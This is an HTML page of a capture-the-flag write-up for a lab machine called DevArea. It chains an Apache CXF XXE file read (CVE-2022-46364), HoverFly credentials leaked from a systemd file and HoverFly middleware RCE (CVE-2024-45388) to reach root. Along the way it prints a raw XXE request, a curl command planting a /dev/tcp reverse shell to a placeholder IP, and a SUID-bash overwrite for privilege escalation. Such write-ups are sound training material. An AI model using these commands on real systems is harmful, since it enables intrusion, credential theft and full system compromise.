@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CTF Writeup — DevArea</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&family=DM+Sans:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet" />
+  <link rel="icon" href="../favicon.ico">
+  <link rel="stylesheet" href="../style.css" />
+  <meta name="google-site-verification" content="3Vc8x1jdXPIbvS5X4iuKAZkwUSr18FC1WMOho-akXHg" />
+</head>
+<body>
+
+<div class="page-wrap">
+
+  <!-- NAV -->
+<nav class="topnav">
+    <a class="topnav-logo" href="../index.html">TomatoBuster</a>
+    <div class="topnav-right">
+      <ul class="topnav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../writeups.html">Writeups</a></li>
+        <li><a href="../categories.html">Categories</a></li>
+      </ul>
+      <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
+        <span class="toggle-moon">🌙</span>
+        <span class="toggle-sun">☀️</span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- HERO -->
+  <header class="hero">
+    <div class="hero-eyebrow">
+      <span class="badge badge-web">WEB</span>
+      <span class="badge badge-medium">MEDIUM</span>
+      <div class="hero-sep"></div>
+      <span class="hero-meta-text">TomatoBuster 2026 &nbsp;·&nbsp; Mar 31, 2026</span>
+    </div>
+    <h1>Dev<span class="accent">Area</span></h1>
+    <p class="hero-desc">
+      XXE injection via CVE-2022-46364 on an Apache CXF SOAP service to read files as <code>dev_ryan</code>, leaking HoverFly credentials — then RCE through CVE-2024-45388 to gain a reverse shell, followed by a syswatch-based bash overwrite for root.
+    </p>
+  </header>
+
+  <!-- INFO STRIP -->
+  <div class="info-strip">
+    <div class="info-cell">
+      <div class="info-label">Category</div>
+      <div class="info-value cyan">Web / Java</div>
+    </div>
+    <div class="info-cell">
+      <div class="info-label">Architecture</div>
+      <div class="info-value">Linux</div>
+    </div>
+    <div class="info-cell">
+      <div class="info-label">Protections</div>
+      <div class="info-value green">None</div>
+    </div>
+    <div class="info-cell">
+      <div class="info-label">Solver</div>
+      <div class="info-value">@Tomat0Buster</div>
+    </div>
+  </div>
+
+  <!-- TOC -->
+  <div class="toc">
+    <div class="toc-title">// Table of Contents</div>
+    <ul>
+      <li><a href="#recon">01 — Reconnaissance &amp; Port Enumeration</a></li>
+      <li><a href="#ftp">02 — FTP Anonymous Login &amp; JAR Analysis</a></li>
+      <li><a href="#xxe">03 — XXE via CVE-2022-46364 (Apache CXF)</a></li>
+      <li><a href="#creds">04 — HoverFly Credential Leak</a></li>
+      <li><a href="#rce">05 — RCE via CVE-2024-45388 (HoverFly Middleware)</a></li>
+      <li><a href="#user-flag">06 — User Flag</a></li>
+      <li><a href="#privesc">07 — Privilege Escalation via syswatch</a></li>
+      <li><a href="#flag">08 — Root Flag</a></li>
+    </ul>
+  </div>
+
+  <!-- SECTION 1 -->
+  <section class="section" id="recon">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2>Reconnaissance &amp; Port Enumeration</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>We kick things off with a standard nmap service scan. The target exposes <b>6 ports</b> — a richer attack surface than usual.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">bash — 80×24</span>
+      </div>
+      <pre><span class="prompt">$ </span><span class="cmd">nmap -sV -sC devarea.htb</span>
+<span class="out">Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 15:29 CEST
+Nmap scan report for devarea.htb (10.129.20.157)
+Host is up (0.073s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
+80/tcp   open  http    Apache httpd 2.4.58
+|_http-title: DevArea - Connect with Top Development Talent
+8080/tcp open  http    Jetty 9.4.27.v20200227
+|_http-title: Error 404 Not Found
+8500/tcp open  http    Golang net/http server
+|_  This is a proxy server. Does not respond to non-proxy requests.
+8888/tcp open  http    Golang net/http server
+|_http-title: Hoverfly Dashboard
+
+Nmap done: 1 IP address (1 host up) scanned in 36.78 seconds</span></pre>
+    </div>
+
+    <p>Several services stand out immediately:</p>
+    <ul>
+      <li><b>Port 21</b> — FTP with <b>anonymous login allowed</b> and a <code>pub/</code> directory.</li>
+      <li><b>Port 8080</b> — Jetty server (Java). Returns 404, but suggests a service is deployed.</li>
+      <li><b>Port 8500</b> — A proxy server (HoverFly proxy endpoint).</li>
+      <li><b>Port 8888</b> — <b>HoverFly Dashboard</b>, protected by a login.</li>
+    </ul>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ</span>
+      <div>
+        <strong>Interesting Stack</strong>
+        The combination of a Java SOAP service (Jetty/CXF on 8080) and HoverFly (a traffic simulation proxy on 8500/8888) immediately suggests two distinct exploit chains to investigate.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 2 -->
+  <section class="section" id="ftp">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2>FTP Anonymous Login &amp; JAR Analysis</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>Anonymous FTP gives us access to a JAR file. We download it and decompile it with <code>jadx</code>.</p>
+
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">1</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Grab the JAR from FTP</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">ftp devarea.htb</span>
+<span class="out">Connected to devarea.htb.
+220 (vsFTPd 3.0.5)
+Name (devarea.htb:tomatobuster): anonymous
+230 Login successful.</span>
+<span class="prompt">ftp> </span><span class="cmd">cd pub</span>
+<span class="prompt">ftp> </span><span class="cmd">binary</span>
+<span class="prompt">ftp> </span><span class="cmd">mget *</span>
+<span class="out">mget employee-service.jar?
+150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
+226 Transfer complete.
+6445030 bytes received in 2.34 seconds</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">2</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Decompile with jadx</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">jadx employee-service.jar</span>
+<span class="prompt">$ </span><span class="cmd">cat employee-service/sources/htb/devarea/ServerStarter.java</span>
+<span class="out">package htb.devarea;
+
+import org.apache.cxf.jaxws.JaxWsServerFactoryBean;
+
+public class ServerStarter {
+    public static void main(String[] args) {
+        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
+        factory.setServiceClass(EmployeeService.class);
+        factory.setServiceBean(new EmployeeServiceImpl());
+        factory.setAddress("http://0.0.0.0:8080/employeeservice");
+        factory.create();
+        System.out.println("Employee Service running at http://localhost:8080/employeeservice");
+        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
+    }
+}</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ</span>
+      <div>
+        <strong>Key Finding</strong>
+        The JAR bundles <b>Apache CXF</b> running on Jetty 9.4.27 (2020). This exposes a SOAP endpoint at <code>http://devarea.htb:8080/employeeservice</code>. Old CXF versions have XXE enabled by default — this is now a clear target.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 3 -->
+  <section class="section" id="xxe">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2>XXE via CVE-2022-46364 (Apache CXF)</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>Googling the CXF version leads us straight to <b>CVE-2022-46364</b>. The SOAP endpoint parses XML without disabling external entity resolution. But the actual exploit on this box is more nuanced than a plain XXE — it abuses <b>XOP Includes inside MTOM multipart requests</b>, which CXF resolves server-side and embeds into the response.</p>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ</span>
+      <div>
+        <strong>What is MTOM and XOP?</strong>
+        <b>MTOM</b> (Message Transmission Optimization Mechanism) is a SOAP extension for efficiently sending binary attachments — instead of base64-encoding them inline, attachments are referenced via <code>xop:Include</code> elements with an <code>href</code> attribute. Apache CXF processes these <code>href</code> URIs server-side to assemble the message. In vulnerable versions, CXF never validates that the URI scheme is safe, so <code>href="file:///etc/passwd"</code> is resolved just as willingly as a legitimate attachment URI. The file contents are then base64-encoded and returned inside the SOAP response body.
+      </div>
+    </div>
+
+    <table class="vuln-table">
+      <thead>
+        <tr>
+          <th>CVE</th>
+          <th>Service</th>
+          <th>Version</th>
+          <th>Impact</th>
+          <th>Severity</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>CVE-2022-46364</code></td>
+          <td>Apache CXF (SOAP/MTOM)</td>
+          <td>≤ 3.5.2 / ≤ 3.4.9</td>
+          <td>XXE/SSRF — read arbitrary files via XOP Include in MTOM SOAP request</td>
+          <td class="severity-high">HIGH</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <p>We use the public PoC from <a id ="link" href="https://github.com/kasem545/CVE-2022-46364-Poc" target="_blank">kasem545/CVE-2022-46364-Poc</a>. The script crafts a multipart SOAP envelope with an <code>xop:Include</code> pointing to a local file path. The raw request looks like this:</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">raw HTTP request — XXE via XOP Include</span>
+      </div>
+      <pre><span class="out">POST /employeeservice HTTP/1.1
+Host: devarea.htb:8080
+Content-Type: multipart/related; type="application/xop+xml";
+              start="&lt;rootpart@soapui.org&gt;";
+              boundary="----=_Part_0_12345";
+              start-info="text/xml"
+
+------=_Part_0_12345
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-ID: &lt;rootpart@soapui.org&gt;
+
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:dev="http://devarea.htb/"
+                  xmlns:xop="http://www.w3.org/2004/08/xop/include"&gt;
+   &lt;soapenv:Body&gt;
+      &lt;dev:submitReport&gt;
+         &lt;arg0&gt;
+            &lt;content&gt;
+               <span class="cmd">&lt;xop:Include href="file:///etc/systemd/system/hoverfly.service"/&gt;</span>
+            &lt;/content&gt;
+         &lt;/arg0&gt;
+      &lt;/dev:submitReport&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+------=_Part_0_12345--</span></pre>
+    </div>
+
+    <p>The server responds with a SOAP envelope containing the file contents as a <b>base64-encoded string</b> inside the <code>&lt;return&gt;</code> element. Decode it to read the file:</p>
+
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">1</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Run the exploit to read /etc/passwd</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">bash</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">python3 CVE-2022-46364.py \
+  -t http://devarea.htb:8080/employeeservice \
+  -s file:///etc/passwd \
+  -d devarea.htb</span>
+<span class="out">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash</span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="callout warning">
+      <span class="callout-icon">⚠</span>
+      <div>
+        <strong>Why MTOM = natural XXE target</strong>
+        Every SOAP request is XML by definition — every byte passes through CXF's XML processor. MTOM adds a layer where <code>xop:Include</code> URIs are resolved <em>before</em> the application logic even sees the request. Since CXF in vulnerable versions trusts all URI schemes including <code>file://</code>, there is no exploit complexity — just craft the multipart boundary, embed the include, and read the response.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 4 -->
+  <section class="section" id="creds">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2>HoverFly Credential Leak</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>The systemd unit file for HoverFly reveals its startup command — complete with hardcoded credentials passed as CLI arguments.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">bash</span>
+      </div>
+      <pre><span class="prompt">$ </span><span class="cmd">python3 CVE-2022-46364.py \
+  -t http://devarea.htb:8080/employeeservice \
+  -s file:///etc/systemd/system/hoverfly.service \
+  -d devarea.htb</span>
+      <pre><span class="out">[Unit]
+Description=HoverFly service
+After=network.target
+
+[Service]
+User=dev_ryan
+Group=dev_ryan
+WorkingDirectory=/opt/HoverFly
+ExecStart=/opt/HoverFly/hoverfly -add -username <span class="flag-out">REDACTED</span> -password <span class="flag-out">REDACTED</span> -listen-on-host 0.0.0.0
+
+Restart=on-failure
+RestartSec=5
+StartLimitIntervalSec=60
+StartLimitBurst=5
+LimitNOFILE=65536
+
+[Install]
+WantedBy=multi-user.target</span></pre>
+    </div>
+
+    <p>We log in to the HoverFly Dashboard at <code>http://devarea.htb:8888</code> using the leaked credentials — it works. We now have an authenticated session on the HoverFly admin panel.</p>
+
+    <div class="callout flag">
+      <span class="callout-icon">⚑</span>
+      <div>
+        <strong>Credentials Found</strong>
+        HoverFly credentials hardcoded in the systemd unit file, readable via the XXE chain. From here, we pivot to the next CVE.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 5 -->
+  <section class="section" id="rce">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2>RCE via CVE-2024-45388 (HoverFly Middleware)</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>A quick CVE search for HoverFly turns up <b>CVE-2024-45388</b>. The vulnerability lies in the <code>/api/v2/hoverfly/middleware</code> endpoint: an authenticated user can set an arbitrary <code>binary</code> and inline <code>script</code>, achieving full RCE.</p>
+
+    <table class="vuln-table">
+      <thead>
+        <tr>
+          <th>CVE</th>
+          <th>Service</th>
+          <th>Impact</th>
+          <th>Severity</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>CVE-2024-45388</code></td>
+          <td>HoverFly (middleware API)</td>
+          <td>Authenticated RCE via <code>/api/v2/hoverfly/middleware</code></td>
+          <td class="severity-high">CRITICAL</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">1</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Start a reverse shell listener</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">terminal 1 — listener</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">ncat -lvp 4444</span>
+<span class="out">Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">2</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Grab the API Bearer token from the browser</div>
+          <p>After logging in to the HoverFly dashboard, open the browser DevTools → Network tab, inspect any API request, and copy the <code>Authorization: Bearer &lt;token&gt;</code> header value.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">3</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Set the malicious middleware payload</div>
+          <p>We PUT our reverse shell script to the middleware endpoint. HoverFly will execute this <code>binary</code> + <code>script</code> for every proxied request — but only once we switch modes and trigger it.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">terminal 2 — exploit</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
+  -H "Authorization: Bearer &lt;token&gt;" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "binary": "bash",
+    "script": "#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
+  }'</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">4</div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Shell received as dev_ryan</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">terminal 1 — shell</span>
+            </div>
+            <pre><span class="out">Ncat: Connection from 10.129.20.157.
+Ncat: Connection from 10.129.20.157:42198.</span>
+<span class="prompt">dev_ryan@devarea:~$ </span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- SECTION 6 — USER FLAG -->
+  <section class="section" id="user-flag">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2>User Flag</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>We have a shell as <code>dev_ryan</code>. The user flag is in the home directory.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">dev_ryan@devarea</span>
+      </div>
+      <pre><span class="prompt">dev_ryan@devarea:~$ </span><span class="cmd">cat user.txt</span>
+<span class="flag-out">HTB{REDACTED}</span></pre>
+    </div>
+
+    <div class="callout flag">
+      <span class="callout-icon">⚑</span>
+      <div>
+        <strong>User Flag Captured</strong>
+        Two CVEs chained together — XXE for file read, middleware injection for RCE. First flag done. Time to go deeper.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 7 — PRIVESC -->
+  <section class="section" id="privesc">
+    <div class="section-header">
+      <span class="section-num">07</span>
+      <h2>Privilege Escalation via syswatch</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>Running <code>linpeas.sh</code> reveals a <code>syswatch.zip</code> in the home directory and a script at <code>/opt/syswatch/syswatch.sh</code> that calls <code>/usr/bin/bash</code> and can be run with <code>sudo</code>. The plan: overwrite <code>/usr/bin/bash</code> with a fake script that creates a SUID root copy of the real bash.</p>
+
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">1</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Back up the real bash binary</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">dev_ryan@devarea</span>
+            </div>
+            <pre><span class="prompt">dev_ryan@devarea:~$ </span><span class="cmd">cp /usr/bin/bash /tmp/bash.bak</span>
+<span class="prompt">dev_ryan@devarea:~$ </span><span class="cmd">chmod +x /tmp/bash.bak</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">2</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Switch to sh and kill all bash processes</div>
+          <p>We need to free <code>/usr/bin/bash</code> before overwriting it. Switching to <code>sh</code> first ensures our session survives <code>killall bash</code>.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">dev_ryan@devarea</span>
+            </div>
+            <pre><span class="prompt">dev_ryan@devarea:~$ </span><span class="cmd">sh</span>
+<span class="prompt">$ </span><span class="cmd">killall bash</span>
+<span class="prompt">$ </span><span class="cmd">lsof /usr/bin/bash</span>
+<span class="out">(no output — file is free)</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">3</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Overwrite /usr/bin/bash with our fake script</div>
+          <p>The fake script uses our backup bash as the interpreter and, when executed, copies it to <code>/tmp/rootbash</code> with the SUID bit set.</p>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">sh session</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">cat > /usr/bin/bash << 'EOF'
+#!/tmp/bash.bak
+cp /tmp/bash.bak /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">4</div>
+          <div class="step-line"></div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Trigger syswatch to execute our fake bash</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">sh session</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">sudo /opt/syswatch/syswatch.sh status</span>
+<span class="out">(syswatch calls /usr/bin/bash — our fake script runs as root)</span>
+<span class="prompt">$ </span><span class="cmd">ls -la /tmp/rootbash</span>
+<span class="out">-rwsr-xr-x 1 root root 1396520 Mar 31 16:11 /tmp/rootbash</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-track">
+          <div class="step-dot">5</div>
+        </div>
+        <div class="step-body">
+          <div class="step-title">// Execute the SUID root shell</div>
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+              <span class="tb-title">sh session → root</span>
+            </div>
+            <pre><span class="prompt">$ </span><span class="cmd">/tmp/rootbash -p</span>
+<span class="prompt">rootbash-5.2# </span></pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="callout warning">
+      <span class="callout-icon">⚠</span>
+      <div>
+        <strong>Why this works</strong>
+        <code>syswatch.sh</code> calls <code>/usr/bin/bash</code> as root via <code>sudo</code>. By replacing that binary with our own script — and using the backup real bash as the shebang interpreter — the script runs with root privileges and produces a SUID binary we control. The <code>-p</code> flag tells bash to preserve the effective UID instead of dropping it.
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 8 — ROOT FLAG -->
+  <section class="section" id="flag">
+    <div class="section-header">
+      <span class="section-num">08</span>
+      <h2>Root Flag</h2>
+      <div class="section-line"></div>
+    </div>
+
+    <p>With an effective root shell, we navigate to <code>/root</code> and grab the final flag.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+        <span class="tb-title">rootbash — root@devarea</span>
+      </div>
+      <pre><span class="prompt">rootbash-5.2# </span><span class="cmd">cd /root</span>
+<span class="prompt">rootbash-5.2# </span><span class="cmd">ls</span>
+<span class="out">root.txt</span>
+<span class="prompt">rootbash-5.2# </span><span class="cmd">cat root.txt</span>
+<span class="flag-out">HTB{REDACTED}</span></pre>
+    </div>
+
+    <div class="flag-reveal">
+      <div class="flag-label">// Root Flag Captured</div>
+      <div class="flag-value" id="flag-text">HTB{REDACTED}</div>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="writeup-footer">
+    <div class="author-block">
+      <div class="author-avatar"></div>
+      <div>
+        <div class="author-info-name">@Tomat0Buster</div>
+        <div class="author-info-role">Web / Java · TomatoBuster</div>
+      </div>
+    </div>
+    <div class="footer-tags">
+      <span class="tag">xxe injection</span>
+      <span class="tag">CVE-2022-46364</span>
+      <span class="tag">Apache CXF</span>
+      <span class="tag">CVE-2024-45388</span>
+      <span class="tag">HoverFly</span>
+      <span class="tag">syswatch privesc</span>
+      <span class="tag">SOAP exploitation</span>
+    </div>
+  </footer>
+
+  <!-- SITE FOOTER -->
+  <footer class="site-footer">
+    <span class="site-footer-logo">TomatoBuster</span>
+    <span class="site-footer-copy">Built by TomatoBuster · 2026</span>
+  </footer>
+
+</div><!-- /page-wrap -->
+
+<script src="../script.js"></script>
+</body>
+</html>
